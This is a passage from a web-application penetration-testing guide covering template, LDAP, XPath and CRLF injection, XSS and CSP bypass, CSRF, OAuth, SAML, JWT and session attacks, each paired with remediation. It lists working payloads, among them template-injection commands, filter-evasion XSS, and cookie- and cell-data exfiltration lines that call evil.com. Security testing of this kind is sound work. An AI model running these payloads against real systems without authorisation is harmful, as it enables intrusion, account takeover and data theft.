  - **ERB (Ruby):** `<%= system('id') %>` or backticks `` <%= `id` %> ``.
  - **Thymeleaf (Spring):** `[[${T(java.lang.Runtime).getRuntime().exec('id')}]]` / preprocessing `__${...}__`.
  - **Handlebars / Pug / EJS (Node):** prototype/constructor gadget chains to reach `process.mainModule.require('child_process')`.
- **Distinguish from client-side template injection (CSTI)** in Angular/Vue (sandbox-escape XSS, not server RCE).
- **Common locations:** email/notification templates, "customize your page", reports, name/greeting fields reflected server-side, error pages.
- **Tools:** `tplmap -u "https://t/?name=x"`, `SSTImap`, Burp.
- **Remediation:** don't let users supply templates; use logic-less/sandboxed templates; pass user data as bound variables, never concatenated into template source.

### 20. LDAP Injection

Input reaches an LDAP filter.

- **Auth bypass:** `*`, `*)(uid=*))(|(uid=*`, `admin)(&)`, `*)(|(password=*))`.
- **Blind extraction:** `(&(uid=admin)(password=a*))` → iterate prefixes (true/false on auth or page diff).
- **Where:** login forms, user/group search, address books, "check username" features backed by Active Directory/OpenLDAP.
- **Remediation:** escape LDAP special chars (`* ( ) \ NUL /`), parameterized filters, allowlist input.

### 21. XPath / XQuery Injection

Input reaches an XPath query over an XML datastore.

- **Auth bypass:** `' or '1'='1`, `'] | //user/* | //users[name='`, `admin' or 'a'='a`.
- **Blind enumeration:** boolean/`substring()`-based extraction of node names/values; `string-length()`, `count()` to map structure.
- **Where:** apps that store users/config in XML and query it with XPath.
- **Remediation:** parameterized XPath / precompiled queries, input escaping.

### 22. CRLF Injection & HTTP Response Splitting

Injecting `\r\n` (`%0d%0a`) into a value that lands in an HTTP response header (or a log).

- **Test:** inject into params/headers reflected in `Location`, `Set-Cookie`, or custom headers: `param=value%0d%0aSet-Cookie:sessionid=attacker` ; `%0d%0aX-Injected:1`.
- **Impact:** session fixation (inject `Set-Cookie`), reflected XSS via injected body (`%0d%0a%0d%0a<script>...`), cache poisoning, header/redirect manipulation, log forging/poisoning (which can chain into log-based LFI→RCE).
- **Where:** `redirect`/`url`/`next` params, language/locale, anything echoed into a header.
- **Tools:** Burp, `crlfuzz`.
- **Remediation:** strip/encode CR/LF in header values; use framework header APIs (most modern ones reject CRLF).

### 23. Host Header Injection

The app trusts the attacker-controlled `Host` (or `X-Forwarded-Host`) header.

- **Test cases:**
  - Change `Host:` to `evil.com` - does it appear in links, `Location`, password-reset emails, or cached responses?
  - **Duplicate Host headers**, absolute-URI request line (`GET https://target.com/ HTTP/1.1` + `Host: evil.com`), line-folding, `Host: target.com:evil` port tricks.
  - **`X-Forwarded-Host`, `X-Forwarded-Server`, `X-Host`, `Forwarded`** override headers.
- **Impacts (each is its own finding/chain):**
  - **Password-reset poisoning** - reset link built from `Host` → victim's email contains an `evil.com` link that leaks the token when clicked (→ ATO; see §52).
  - **Web cache poisoning** - see §59.
  - **Routing-based SSRF / internal access** via `Host`-based virtual routing.
  - **Reflected XSS / open redirect** when `Host` is echoed unsanitized.
- **Tools:** Burp (Match/Replace rule to globally swap Host), Param Miner.
- **Remediation:** use an allowlist of expected hostnames; build absolute URLs from server config, never from the request `Host`.

### 24. SSI & ESI Injection

- **Server-Side Includes (SSI):** input reflected into `.shtml`/SSI-enabled pages.
  - Probe: `<!--#echo var="DATE_LOCAL" -->`, RCE: `<!--#exec cmd="id" -->`, file read: `<!--#include virtual="/etc/passwd" -->`.
- **Edge-Side Includes (ESI):** processed by reverse proxies/CDNs (Varnish, Akamai, Fastly, Squid).
  - Probe: `<esi:include src="http://evil.com/"/>`; can yield SSRF, ESI-based XSS (some engines render included HTML), cookie/header exfil, and ESI-to-XSLT chains.
- **Where:** any reflected input behind a caching proxy; check `Surrogate-Control` header for ESI support.
- **Remediation:** disable SSI/ESI where unused; never reflect raw input into SSI/ESI-parsed content.

### 25. Email / SMTP Header Injection

- **What it is:** CRLF injection into email fields (sender, subject, recipient) lets you inject extra headers/recipients - `Bcc:` yourself on a "contact us"/"invite" feature, rewrite `From`, or inject body content for phishing.
- **Test:** `name=foo%0d%0aBcc:attacker@evil.com`, `subject=hi%0d%0aContent-Type:text/html` (HTML email injection), SMTP command injection in vulnerable mailers.
- **Where:** contact forms, "share via email", invites, support tickets, newsletter signups.
- **Remediation:** validate/strip CRLF in all email-bound fields; use a hardened mail library.

### 26. CSV / Formula (Spreadsheet) Injection

- **What it is:** user input stored and later exported to CSV/XLSX; a value starting with `=`, `+`, `-`, `@`, tab, or CR is interpreted as a formula when opened in Excel/Sheets → data exfiltration, command exec via DDE/`=cmd`.
- **Payloads:** `=cmd|'/C calc'!A0`, `=HYPERLINK("http://evil.com?d="&A1,"click")` (exfil cell data), `@SUM(1+1)*cmd|...`, `=WEBSERVICE("http://evil.com")`.
- **Where:** any field that ends up in an exported report (names, addresses, comments, support tickets).
- **Remediation:** prefix risky leading chars with `'` on export, quote fields, set cell type, or sanitize.

### 27. XSLT Injection

- **What it is:** attacker controls part of an XSLT stylesheet processed server-side → file read, SSRF, RCE (via extension functions), and version disclosure.
- **Probe:** `<xsl:value-of select="system-property('xsl:vendor')"/>`; read files with `document()`/`unparsed-text()`; PHP/Java extension functions for RCE.
- **Where:** XML→HTML/PDF transformation features, document generators.
- **Remediation:** disable extension functions/external access in the XSLT processor; don't accept user stylesheets.

### 28. HTTP Parameter Pollution (HPP) & Server-Side Parameter Pollution (SSPP)

- **HPP:** supply a parameter twice (`?role=user&role=admin`). Different layers pick different occurrences (first/last/concatenated) → filter bypass, WAF evasion, logic flaws, auth bypass.
  - Test both query and body; mix `application/x-www-form-urlencoded` duplicates.
- **SSPP:** your input is placed into a **server-to-server** request's query string; inject `&` / `#` to add or truncate downstream parameters (e.g., inject `&admin=true` or `#` to drop a signature param into an internal API call).
- **Where:** anything that forwards your input into an internal/3rd-party API URL (search proxies, payment, SMS/OTP providers).
- **Remediation:** canonicalize parameters; encode values placed into outbound URLs; use structured request builders.

### 29. HTML Injection & Content Spoofing

- **What it is:** unsanitized HTML reflected/stored without script execution (CSP blocks JS, or only markup is allowed) - still useful for phishing (inject a fake login form), defacement, dangling-markup data exfiltration, and as a stepping stone to XSS.
- **Test:** `<h1>x</h1>`, `<a href=//evil.com>click</a>`, `<form action=//evil.com>...`, dangling markup: `<img src='//evil.com?` to capture following page content/CSRF tokens.
- **Remediation:** context-aware output encoding; sanitize allowed HTML with a vetted library (DOMPurify server-side equivalent).

---

## Part V - Cross-Site Scripting (XSS)

Attacker-controlled script executes in a victim's browser in the app's origin → session theft, ATO, keylogging, request forgery, defacement, worming.

### 30. XSS - Reflected, Stored, DOM, Blind

**Types & where they live:**

- **Reflected** - input echoed in the immediate response (search, error messages, URL params). Requires delivering a crafted link/request to the victim.
- **Stored** - input persisted and rendered to others (comments, profile name/bio, support tickets, filenames, product reviews, log viewers). Highest impact (no user interaction; hits admins).
- **DOM-based** - a client-side script writes attacker-controlled data into a dangerous sink with no server round-trip. (See sinks below.)
- **Blind** - stored XSS that fires in a context you can't see (admin dashboard, support agent's panel, log viewer, monitoring tool). Detect with an OOB callback payload.

**Detection:**

- Inject a unique marker, find where/how it reflects (HTML body, attribute, `<script>`, JS string, URL, CSS, comment), then craft a context-appropriate breakout.
- Determine which chars survive (`<`, `>`, `"`, `'`, `/`, `(`, `)`, `{`, `}`, `;`, and the backtick) and which are encoded — that dictates your payload.

**Context-specific payloads:**

- **HTML body:** `<script>alert(document.domain)</script>`, `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`, `<details open ontoggle=alert(1)>`.
- **HTML attribute:** break out - `"><svg onload=alert(1)>`; or stay in: `" autofocus onfocus=alert(1) x="`.
- **Inside `<script>` / JS string:** `';alert(1)//`, `</script><svg onload=alert(1)>`, break template literals with `${alert(1)}`.
- **URL/`href`/`src`:** `javascript:alert(1)`, `data:text/html,<script>alert(1)</script>`.
- **DOM sinks to hunt:** `innerHTML`, `outerHTML`, `document.write`, `insertAdjacentHTML`, `eval`, `setTimeout`/`setInterval` (string arg), `location`/`location.href`, `jQuery $()`/`.html()`/`.append()`, `Function()`, `srcdoc`, `setAttribute` on event handlers. Sources: `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage`, `localStorage`.

**Filter / WAF evasion:**

- Case (`<ScRiPt>`), no closing tag, alternative tags/events (`onerror`, `onload`, `onpointerover`, `onanimationstart`, `ontoggle`), whitespace/newlines, encoding (HTML entities, URL, double-URL, unicode `\u`, hex, `String.fromCharCode`), comment splitting, null bytes, `eval(atob('...'))`.
- **The PortSwigger polyglot** (works across many contexts):
  ```
  jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
  ```
- **mutation XSS (mXSS):** payloads that are "safe" until the browser's HTML parser re-serializes/normalizes them (e.g., inside `<svg>`, `<math>`, `<noscript>`, `<template>`, or via `innerHTML` round-trips) - defeats some sanitizers like older DOMPurify versions.

**Blind XSS:**

- Use an OOB collector: XSS Hunter / `interactsh` / your own beacon. Payload exfiltrates `document.domain`, cookies, DOM, screenshots when it fires in a hidden panel.
- Seed it everywhere stored & later-viewed: contact forms, user-agent, referer, support tickets, order notes, filenames, `X-Forwarded-For` (log viewers).

**Escalation (prove impact - don't just `alert(1)`):**

- Steal session/JWT (if not `HttpOnly`): `fetch('//evil/?c='+document.cookie)`.
- **Account takeover via XSS**: read CSRF token then change email/password, add OAuth app, or create an API key - all from the victim's session.
- Capture keystrokes, deface, pivot via CORS/`fetch` to internal APIs the victim can reach.

**Tools:** `dalfox`, Burp Scanner + XSS Validator, `XSStrike`, KNOXSS, browser DevTools for DOM tracing.

**Remediation:** context-aware output encoding (HTML/attr/JS/URL/CSS), a strict CSP as defense-in-depth, sanitize HTML with a maintained library, set `HttpOnly` on session cookies, avoid dangerous DOM sinks (use `textContent`, framework-safe bindings).

### 31. Content Security Policy (CSP) - Review & Bypass

A strong CSP mitigates XSS; a weak one is a false sense of security.

- **Evaluate the policy:** paste into Google's CSP Evaluator. Red flags:
  - `unsafe-inline` / `unsafe-eval` in `script-src`.
  - Wildcards (`*`, `https:`) or overly broad hosts.
  - **JSONP endpoints** on an allowlisted host → `script-src` bypass (`<script src="https://allowed.com/jsonp?cb=alert(1)//">`).
  - Allowlisted CDNs hosting Angular/AngularJS or other gadget libraries → bypass via known gadgets.
  - Missing `object-src 'none'` and `base-uri 'none'` (base-tag hijack → steal relative-script loads, dangling-markup).
  - Nonce reuse or predictable nonces; nonce leakage via DOM.
- **Bypass building blocks:** dangling markup exfiltration, `<base>` injection, policy-injection (if you control part of the CSP), and using allowed inline event handlers when `script-src` permits `unsafe-hashes`.
- **Remediation:** nonce/hash-based `script-src` with `'strict-dynamic'`, no `unsafe-inline`/`unsafe-eval`, `object-src 'none'`, `base-uri 'none'`, report-only rollout first.

---

## Part VI - Client-Side & Browser-Based Attacks

### 32. Cross-Site Request Forgery (CSRF)

Force an authenticated victim's browser to submit a state-changing request.

- **Preconditions:** session via cookies (auto-sent), no/weak anti-CSRF protection, a predictable request.
- **Token bypass tests:**
  - Remove the CSRF token entirely; send empty token; send another user's valid token; swap a randomly-valid-format token; downgrade `POST`→`GET`.
  - Token tied to session? Not validated server-side? Validated only if present? Reflected from a param you control?
- **SameSite & cookie nuances:**
  - `SameSite=Lax` (modern default) still allows top-level `GET` navigations → CSRF on state-changing `GET`s, and a ~2-minute window on newly-set cookies in some browsers.
  - `SameSite=None` (must be `Secure`) → fully cross-site; check subdomains and sibling-domain cookie scoping (cookie tossing).
  - Method/`Content-Type` tricks: change `Content-Type` to `text/plain`, `application/x-www-form-urlencoded`, or `multipart/form-data` to avoid pre-flight and submit "JSON-ish" bodies via a form.
- **Referer-based defenses:** test missing/blank Referer (via `<meta name="referrer" content="no-referrer">`), and lenient checks (substring match → `evil.com/target.com`).
- **JSON CSRF:** if the endpoint accepts `text/plain` JSON, use a form with the body as a single field; or exploit a CORS misconfig.
- **PoC:** auto-submitting HTML form / `fetch` with `credentials:'include'`; Burp → "Generate CSRF PoC".
- **Impact gating:** the action must be sensitive (change email/password, transfer funds, change role). Logout CSRF / low-value actions are usually low/N-A.
- **Remediation:** synchronizer tokens or double-submit cookies, `SameSite=Lax/Strict`, re-auth for sensitive actions, custom-header requirement for JSON APIs.

### 33. WebSocket Security & Cross-Site WebSocket Hijacking (CSWSH)

- **Cross-Site WebSocket Hijacking:** if the WS handshake authenticates via cookies and **doesn't validate `Origin`**, `evil.com` can open a WS to the target and read/send messages as the victim (data theft, actions). The CSRF of WebSockets.
  - Test: replay the handshake with `Origin: https://evil.com`; if it connects, it's vulnerable.
- **Also test:** injection inside WS messages (SQLi/XSS/command into message payloads), missing authz on individual WS actions, tampering message fields (IDOR over WS), lack of rate limiting, sensitive data in messages, and message-level auth bypass.
- **Tools:** Burp (WebSocket history + repeater), `wsrepl`, browser DevTools.
- **Remediation:** validate `Origin` on the handshake, use per-message authz, CSRF token in the handshake, TLS (`wss://`).

### 34. Web Messaging (postMessage) Vulnerabilities

- **Receiver flaws:** a `message` event listener that uses event data in a dangerous sink (`innerHTML`, `eval`, `location`) **without checking `event.origin`** → DOM XSS from any origin (an attacker iframe/window posts the payload).
- **Sender flaws:** `postMessage(secret, "*")` - wildcard `targetOrigin` leaks data to any framing origin.
- **Test:** find listeners (`window.addEventListener('message', ...)`), trace data into sinks, and check for missing/loose origin validation (`indexOf`/`startsWith` checks are often bypassable: `https://target.com.evil.com`).
- **Remediation:** strict `event.origin` allowlist on receive; explicit `targetOrigin` on send; never feed message data into HTML/JS sinks.

### 35. Client-Side Prototype Pollution

- **What it is:** attacker pollutes `Object.prototype` via `__proto__`/`constructor`/`prototype` keys in a recursive merge/clone/`Object.assign`/query-string parser → injected properties appear on every object, enabling DOM XSS (gadget chains in libraries) or logic bypass.
- **Test:** `?__proto__[testprop]=polluted` (or `?constructor[prototype][testprop]=...`) then check `Object.prototype.testprop` in console. Look for sources: `location.hash`/`search` parsed into objects, JSON merge of user input.
- **Gadgets:** libraries that read config off the prototype (jQuery, sanitizers, template/ad scripts) turn pollution into XSS. PortSwigger's DOM Invader automates source→gadget discovery.
- **Remediation:** `Object.freeze(Object.prototype)`, `Map` instead of object dicts, block `__proto__`/`constructor`/`prototype` keys, null-prototype objects, schema validation.

### 36. DOM Clobbering

- **What it is:** when JS uses a global like `window.x` or `document.x` that can be "clobbered" by injecting HTML elements with matching `id`/`name` (no script needed) → override variables/config, bypass CSP-restricted environments where script injection is blocked but HTML injection isn't.
- **Test:** inject `<a id=config>` / `<form id=config><input name=url value=//evil></form>` and see if app logic reads `config.url` from your element. `<a id=x href=...>` clobbers `window.x`.
- **Where:** HTML-injection sinks where script is filtered but markup (and `id`/`name`/`form`) is allowed.
- **Remediation:** explicit variable declarations, avoid relying on named DOM properties, sanitize `id`/`name` in user HTML, freeze critical config objects.

### 37. Open Redirect

- **What it is:** a redirect target controlled by user input → phishing (trusted domain → attacker), and a key enabler for **OAuth/SSO token theft** and **SSRF** chains.
- **Common parameters:** `next`, `url`, `target`, `redirect`, `redirect_uri`, `redirect_url`, `return`, `returnTo`, `return_to`, `return_url`, `dest`, `destination`, `redir`, `r`, `u`, `go`, `goto`, `out`, `view`, `continue`, `checkout_url`, `image_url`, `callback`, `success_url`, `cancel_url`.
- **Bypass table (filter evasion):**

| Technique | Example |
| --- | --- |
| Scheme-relative | `//evil.com`, `\/\/evil.com` |
| Backslash tricks | `https:\\evil.com`, `/\evil.com`, `\/evil.com` |
| Whitelist as path/userinfo | `https://target.com@evil.com`, `https://evil.com#target.com`, `https://evil.com?x=target.com` |
| Subdomain/suffix confusion | `https://target.com.evil.com`, `https://eviltarget.com` |
| Encoding | `%2f%2fevil.com`, double-encode, unicode dot `evil。com`, `%00`, `%09`, `%0d%0a` |
| Missing-slash / IP / octal | `https:/evil.com`, decimal/octal IPs |

- **Test:** intercept any redirect; replace the target; follow the chain (some redirects are JS-based `location.href` → also DOM-XSS candidates).
- **Remediation:** allowlist redirect destinations (relative paths or a fixed host list); never reflect arbitrary URLs; map an opaque token → URL server-side.

### 38. Reverse Tabnabbing

- **What it is:** a link with `target="_blank"` (without `rel="noopener noreferrer"`) lets the opened page rewrite the opener tab via `window.opener.location` → silent phishing redirect of the original tab.
- **Test:** find user-controllable links / markdown that render `target=_blank` without `noopener`.
- **Remediation:** add `rel="noopener noreferrer"`; modern browsers default to `noopener` for `_blank` but legacy/edge cases remain.

### 39. Cross-Site Script Inclusion (XSSI)

- **What it is:** sensitive data served as a script-includable resource (JS/JSONP, or a dynamic JS that references global vars) can be `<script src>`-included cross-origin and read via overridden globals/setters or callback abuse → cross-origin data leak (auth-state-dependent).
- **Test:** include sensitive `*.js`/JSONP endpoints from an attacker page; override constructors/array setters to capture leaked data; abuse `callback=` JSONP params.
- **Remediation:** require auth + CSRF token for data endpoints, prefix JSON with `)]}'`/`while(1);`, set correct `Content-Type` + `nosniff`, don't expose data as executable JS.

### 40. Relative Path Overwrite (RPO) & CSS Injection

- **RPO:** path/URL handling tricks make a page load attacker-influenced relative resources (CSS/JS), enabling style injection or script execution in older/edge configs.
- **CSS injection:** injected CSS can exfiltrate data via attribute selectors + `background:url()` (e.g., steal CSRF tokens/`input value` char-by-char), and aid clickjacking/UI spoofing - useful when script is blocked by CSP.
- **Remediation:** absolute resource paths, correct `Content-Type`, CSP, sanitize injected style.

---

## Part VII - Access Control & Authorization

The #1 category in the OWASP Top 10 (2021) and the bug-bounty bread-and-butter. Always test with **(at least) two accounts** and an unauthenticated session so you can prove cross-user access.

### 41. IDOR / Broken Object-Level Authorization (BOLA)

Accessing/modifying another user's object by manipulating an identifier the server doesn't authorize.

- **Where the ID lives:** path (`/api/users/123`, `/invoice/456`), query (`?id=`, `?account=`, `?order=`), body/JSON, headers, cookies, and **inside JWTs/encoded blobs**.
- **Test methodology:**
  1. As user A, capture a request referencing A's object.
  2. As user B (different session), replay it with A's ID - does B get A's data?
  3. Try with **no auth**, with a lower-privileged role, and across tenants (multi-tenant SaaS).
- **ID variations to try:**
  - Sequential/predictable integers (`123` → `124`); enumerate ranges with Intruder.
  - UUIDs/GUIDs - leak them elsewhere (search, autocomplete, public profiles, referer, other endpoints) then reuse; check for v1 (time-based, guessable) UUIDs.
  - Hashed/encoded IDs (base64, hex, MD5 of a small int) - decode, predict, re-encode.
  - Arrays/wildcards: `id=[123,124]`, `id=*`, `id=123,124`, JSON array bodies (mass IDOR).
- **Method & shape tricks:** swap `GET`↔`POST`, add `.json`/`.xml` suffix, change `id` to `id[]`, send the param twice (HPP), add it where it's normally implicit (override "current user").
- **Blind IDOR:** no data returned but the action succeeds (e.g., delete/transfer) - confirm via side effects.
- **GraphQL/`node(id:)` IDOR**, WebSocket IDOR, and IDOR in file downloads (`/files/{uuid}`) and S3 pre-signed URLs.
- **Common parameters:** `id`, `uid`, `user_id`, `account`, `account_id`, `order`, `order_id`, `no`, `doc`, `document_id`, `file`, `key`, `email`, `group`, `profile`, `invoice`, `customer`, `cart`, `ticket`, `msg`, `conversation`.
- **Tools:** Burp Repeater, **Autorize/AuthMatrix** (auto-replay as another user), Intruder for enumeration, `Auto Repeater`.
- **Remediation:** server-side authorization on every object access keyed to the session principal (never trust client IDs); use unguessable IDs as defense-in-depth, not as the control; centralized access-control checks.

### 42. Privilege Escalation (Vertical & Horizontal)

- **Vertical (user → admin):**
  - Tamper role fields: `role=user`→`admin`, `isAdmin=false`→`true`, `account_type`, `group_id`, `permissions[]`, `level`.
  - Access admin endpoints/UI directly (force-browse `/admin`, `/api/admin/*`) - see §43.
  - Register/modify with elevated role (mass assignment, §44).
  - Manipulate JWT/claims (`role` claim) if signature is weak (§50).
- **Horizontal (user → another user):** the IDOR/BOLA family (§41) plus tenant crossing.
- **Test for:** parameter-based role checks, hidden role fields in responses (then add them to requests), step-skipping in approval workflows, and "view as user"/impersonation features missing re-authz.
- **Remediation:** server-side RBAC/ABAC, deny-by-default, never derive privilege from client input.

### 43. Broken Function-Level Authorization (BFLA) / Missing Function-Level Access Control

- **What it is:** sensitive functions/endpoints aren't restricted by role - a normal user can invoke admin or privileged operations directly.
- **Test:**
  - Enumerate admin/privileged endpoints (from JS, swagger, history, `/admin`, `/api/internal`, `/v1/admin/*`) and call them as a low-priv user / unauthenticated.
  - Verb-based: an endpoint hides the button for non-admins but the `POST`/`DELETE` still works.
  - Method override / different API version (`/api/v1` enforces authz, `/api/v2` or `/api/internal` doesn't).
- **Tools:** Autorize (compare enforced vs. unenforced), manual force-browsing with each role.
- **Remediation:** enforce authorization at the function/route level for every privileged action, server-side, deny-by-default.

### 44. Mass Assignment / Autobinding (Excessive Binding)

- **What it is:** the framework binds the whole request body to a model, so adding extra fields the UI never exposes sets server-controlled attributes (`isAdmin`, `role`, `verified`, `balance`, `credits`, `is_active`, `user_id`, `price`).
- **Test:**
  - Diff a `GET` of an object vs. what the `PUT/POST` accepts; add the read-only/privileged fields into the update body.
  - On registration/profile update: add `"role":"admin"`, `"isAdmin":true`, `"emailVerified":true`, `"approved":true`, `"accountBalance":99999`.
  - Try nested objects and alternate casing/naming the backend might accept.
- **Common in:** Rails (`strong_parameters` missing), Spring (`@ModelAttribute`), Node/Mongoose, Django REST (`fields = '__all__'`), Laravel (`$guarded`/`$fillable`).
- **Remediation:** explicit allowlist of bindable fields (DTOs), never bind directly to persistence models, separate read/write schemas.

### 45. Business Logic Flaws

Bugs in the intended workflow - no "malformed input", just abuse of legitimate functionality. Scanners miss these; they pay well.

- **Quantity/price/amount tampering:** negative quantities/prices, zero, decimals (`0.001`), integer overflow, currency confusion, oversized values, client-side-trusted totals.
- **Workflow / step manipulation:** skip steps (jump to "confirm" without "pay"), repeat steps (apply a discount/coupon multiple times), reorder steps, replay a one-time action.
- **Race conditions** (their own class - see §61): double-spend, redeem a coupon/gift card twice, withdraw twice, bypass a one-per-user limit.
- **Insufficient validation of trust boundaries:** server trusts a "verified" flag, a price, a discount, or a status that the client supplied.
- **Authentication/authorization logic gaps:** "remember me" never expires, password change without current password, email change without verification (→ ATO), promo/referral self-abuse, free-trial reset.
- **Numeric & limit bypasses:** transfer more than your balance, book more than capacity, exceed rate/usage caps, bypass a max-attempts counter by resetting state.
- **Inconsistent multi-channel state:** mobile API vs. web API enforce different rules; legacy endpoint skips a check.
- **Test approach:** map the state machine; for each transition ask "what if I skip / repeat / reorder / send a value outside the intended range / do it as a different role / do two at once?"
- **Remediation:** enforce all invariants server-side, validate state transitions, idempotency keys, re-derive prices/totals server-side, atomic operations with locks (see §61).

---

## Part VIII - Authentication, Session & Identity

### 46. Authentication Testing

- **Username / account enumeration:** differential responses ("user not found" vs "wrong password"), HTTP status, response length/time, behavior on login/register/reset/forgot. Confirm with timing analysis where messages are uniform.
- **Credential brute-force / password spraying:** weak/no lockout, weak password policy, no rate limiting (and bypasses - see §47/§66), default creds (`admin:admin`, vendor defaults), reused breach creds (authorized scope only).
- **Login over HTTP / mixed content / credentials in URL** (`GET /login?password=`) → sniffable, logged, cached, in `Referer`.
- **Weak "remember me" / persistent cookies:** predictable tokens, no expiry, not invalidated on password change, encodes username/role.
- **Missing re-authentication** for sensitive actions (change email/password, disable 2FA, add payment method, delete account).
- **Auth bypass:** SQLi/NoSQLi/LDAP in login (Part IV), response manipulation (change `"success":false`→`true`), forced browsing past the login, direct API access skipping the UI gate.
- **Default/registration weaknesses:** self-registration of privileged roles (mass assignment §44), predictable initial passwords, email verification not enforced.
- **Tools:** Burp Intruder (cluster bomb/pitchfork), `hydra`, `medusa`, Turbo Intruder for speed.
- **Remediation:** uniform error messages, rate limiting + lockout (with abuse-resistant counters), strong password policy + breach-password checks, MFA, re-auth for sensitive ops, TLS everywhere.

### 47. Multi-Factor / 2FA / OTP Bypass

- **Response manipulation:** intercept the verify response and flip `{"verified":false}`→`true` / change status code → bypass.
- **OTP brute-force:** 4–6 digit code with no/weak rate limit; bypass limits via IP-rotation headers, parallel requests (race), or per-attempt new session.
- **Code reuse / non-expiry / non-invalidation:** old OTP still valid, same OTP for multiple actions, OTP not bound to the user/session.
- **Lack of binding:** request OTP for victim, verify with **your** session; or change the `user_id` on the verify call (IDOR).
- **Backup/recovery code weaknesses:** predictable, brute-forceable, not rate-limited, leaked.
- **Flow bypass:** access post-login resources directly without completing 2FA (the 2FA step is UI-only); the `is2faComplete` flag is client-side or settable.
- **Disable/re-enroll without re-auth:** turn off victim's 2FA via CSRF/IDOR, or enroll your device to their account.
- **Null/zero/leading-zero & default codes:** `000000`, empty, `null`, array.
- **"Remember this device" abuse:** forge/replay the trust token; check scope and expiry.
- **OTP leakage:** OTP returned in the API response, in a header, or reflected; SMS/email link with a guessable token.
- **Remediation:** server-side enforced step-up, strict per-account rate limit + lockout on OTP, single-use short-TTL codes bound to user+action, re-auth to change MFA, constant-time compare.

### 48. OAuth 2.0 & OpenID Connect (OIDC)

Rich attack surface; flaws here are frequently full ATO.

- **`redirect_uri` manipulation (the classic):**
  - Pre-registered URI not strictly validated → redirect the auth `code`/`token` to attacker (`redirect_uri=https://evil.com`).
  - Bypasses: open redirect on a whitelisted domain (chain §37), path/subdomain/loose-matching (`https://target.com.evil.com`, `https://target.com/../evil`), `localhost`, extra params, fragment vs query, `redirect_uri` with `&`/`#`/`@` tricks.
- **`state` parameter (CSRF on the callback):** missing/static/not-validated `state` → login CSRF / forced account linking → ATO. Always check `state` is present, unguessable, and verified.
- **`nonce` (OIDC) missing/unverified** → ID-token replay.
- **Account-linking / pre-account-takeover:** link attacker's OAuth identity to a victim's email, or pre-register a victim's email so their later OAuth login lands in the attacker's account. Test email-collision between social login and local accounts (unverified email trust).
- **Token leakage:** access/ID token or `code` in `Referer` (to third-party resources), in browser history, in logs; via open redirect; via `response_mode` manipulation (`query` vs `fragment` vs `form_post`).
- **`response_type` / flow downgrade:** force implicit flow (`token`) to leak tokens in the URL; mix `code token`.
- **PKCE issues:** missing PKCE on public clients, `code_challenge_method=plain`, server not enforcing the verifier → code interception.
- **Scope escalation / consent bypass:** request broader scopes; reuse a `code`; check if consent can be skipped or replayed.
- **`client_secret` exposure** in mobile/SPA bundles; **authorization-code reuse** (should be single-use); **token substitution** (use a token issued for app A on app B - "confused deputy").
- **JWT-based ID tokens:** validate per §50 (alg confusion, `jku`/`kid`, weak key).
- **Tools:** Burp + manual, EsPReSSO / OAuth-focused extensions.
- **Remediation:** exact `redirect_uri` matching, mandatory & verified `state`+`nonce`, PKCE (S256) for public clients, single-use short-lived codes, verify token audience/issuer/signature, don't trust unverified emails for linking.

### 49. SAML & SSO

- **Signature attacks:**
  - **XML Signature Wrapping (XSW)** - relocate/duplicate the signed element so the validator checks a signed copy but the app consumes an unsigned attacker-controlled assertion (impersonate any user). 8 XSW variants - automate with **SAML Raider** (Burp).
  - **Signature stripping / `none`** - remove the signature and see if it's still accepted.
  - **Signature exclusion / unsigned assertions** accepted.
- **Assertion tampering:** change `NameID`/email/`username` to the victim's, modify roles/groups/attributes, swap the audience.
- **XXE in the SAML response** (it's XML - see §18); comment injection in `NameID` (`admin<!---->@evil.com` parsed as `admin@...`).
- **Replay:** missing/long `NotOnOrAfter`, no `InResponseTo` validation, reusable assertions.
- **Recipient/ACS confusion:** redirect the assertion to a different Assertion Consumer Service URL.
- **Key confusion / self-signed cert accepted** as IdP.
- **Tools:** SAML Raider, Burp, manual base64/inflate of SAMLRequest/Response.
- **Remediation:** validate signature over the whole assertion, reject unsigned/`none`, pin IdP cert, enforce `InResponseTo`/`Recipient`/`NotOnOrAfter`, disable DTDs.

### 50. JSON Web Token (JWT) Attacks

- **Algorithm confusion / `none`:**
  - `alg: none` (and case variants `None`/`nOnE`) - strip the signature; if accepted, forge any claims.
  - **RS256→HS256 confusion** - server verifies an HS256 token using the **public** RSA key as the HMAC secret → forge tokens (sign with the known public key). 
- **Weak HMAC secret:** brute/dictionary-crack `HS256` secrets offline (`jwt_tool`, `hashcat -m 16500`) → re-sign with arbitrary claims.
- **Header-injection key tricks:**
  - **`jku`/`x5u`** - point to an attacker-hosted JWKS/cert (if the URL isn't allowlisted) → sign with your own key.
  - **`kid` injection** - path traversal (`kid: ../../dev/null` → empty key), SQLi, or command injection via `kid`; force a predictable key.
  - **`jwk` embedded key** - server trusts a public key embedded in the token header.
- **Claim tampering:** `sub`/`user_id`/`role`/`isAdmin`/`scope`/`aud`/`exp` - change after defeating signing; test if `exp`/`nbf` are even checked (expired token replay), and if `aud`/`iss` are validated (cross-service token reuse).
- **Other:** sensitive data in the (base64, not encrypted) payload; missing `typ`/`cty` confusion; nested JWT/JWE issues; token not invalidated on logout/password change.
- **Tools:** `jwt_tool`, Burp **JWT Editor**, `jwt.io` (decode only - don't paste secrets into web tools on real engagements), `hashcat`.
- **Remediation:** pin the algorithm server-side, reject `none`, separate keys per algorithm, allowlist `jku`/`x5u`, validate `exp`/`nbf`/`aud`/`iss`, strong secrets, short TTL + revocation list.

### 51. Session Management

- **Session fixation:** session ID doesn't rotate on privilege change/login - fix a victim's session pre-auth, then ride it. Compare token before/after login.
- **Token strength/predictability:** analyze randomness (Burp Sequencer), look for sequential/encoded/derivable session IDs.
- **Insecure cookie attributes:** missing `HttpOnly` (XSS can steal), `Secure` (sent over HTTP), `SameSite` (CSRF); weak scope (`Domain=.target.com` over-shares to subdomains → cookie tossing); missing `__Host-`/`__Secure-` prefix.
- **Session lifecycle:** not invalidated on logout / password reset / email change / role change; concurrent sessions allowed and not revoked; absolute & idle timeout missing; "logout" only clears client cookie.
- **Token leakage:** session ID in URL, logs, `Referer`, error pages, or returned in API bodies.
- **Cookie injection / tossing / jar overflow:** set/override cookies via a subdomain XSS or CRLF; overflow the cookie jar to evict secure cookies.
